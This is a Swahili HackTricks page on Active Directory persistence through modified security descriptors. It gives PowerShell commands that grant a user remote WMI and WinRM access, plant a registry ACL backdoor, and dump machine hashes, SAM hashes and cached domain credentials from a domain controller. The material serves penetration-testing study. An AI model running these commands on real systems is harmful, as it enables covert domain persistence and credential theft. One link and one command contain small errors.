# Vielelezo vya Usalama

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Vielelezo vya Usalama

[Kutoka kwenye nyaraka](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Lugha ya Ufafanuzi wa Vielelezo vya Usalama (SDDL) inafafanua muundo unaotumiwa kuelezea vielelezo vya usalama. SDDL hutumia vifungu vya ACE kwa DACL na SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Vielelezo vya usalama** hutumiwa kuhifadhi **ruhusa** ambazo **kifaa** kina **juu** ya **kifaa** kingine. Ikiwa unaweza tu **kufanya** mabadiliko **kidogo** kwenye **ielekezi ya usalama** ya kifaa, unaweza kupata ruhusa za kuvutia sana juu ya kifaa hicho bila kuwa mwanachama wa kikundi cha wanao na madaraka.

Kwa hiyo, mbinu hii ya kudumu inategemea uwezo wa kupata kila ruhusa inayohitajika dhidi ya vitu fulani, ili kuweza kutekeleza kazi ambayo kawaida inahitaji madaraka ya msimamizi lakini bila haja ya kuwa msimamizi.

### Upatikanaji wa WMI

Unaweza kumpa mtumiaji upatikanaji wa **kutekeleza WMI kwa mbali** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Upatikanaji wa WinRM

Toa upatikanaji wa **konsoli ya winrm PS kwa mtumiaji** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Upatikanaji wa mbegu za siri kwa njia ya kijijini

Fikia **registry** na **pata mbegu za siri** kwa kuunda **mlango wa nyuma wa Reg** kwa kutumia [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ili uweze wakati wowote kupata **mbegu ya kompyuta**, **SAM** na **vyeti vya AD vilivyohifadhiwa** kwenye kompyuta. Hivyo, ni muhimu sana kumpa idhini hii kwa **mtumiaji wa kawaida dhidi ya kompyuta ya Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Angalia [**Tiketi za Fedha**](silver-ticket.md) ili kujifunza jinsi unavyoweza kutumia hash ya akaunti ya kompyuta ya Domain Controller.

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
